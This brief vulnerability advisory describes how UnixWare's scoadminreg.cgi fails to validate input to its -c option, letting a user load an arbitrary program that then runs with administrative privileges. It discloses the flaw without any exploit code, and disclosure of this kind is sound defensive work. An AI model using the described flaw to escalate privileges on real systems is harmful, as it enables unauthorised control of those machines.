UnixWare is a commercial Unix implementation distributed originally developed by SCO. It is now maintained and distributed by Caldera.

The scoadminreg.cgi program does not properly validate user input when executed with the -c option. Because of this, a user may load an arbitrary program with the -c flag. When this program is executed, the file loaded with the -c flag will be executed with administrative privileges.
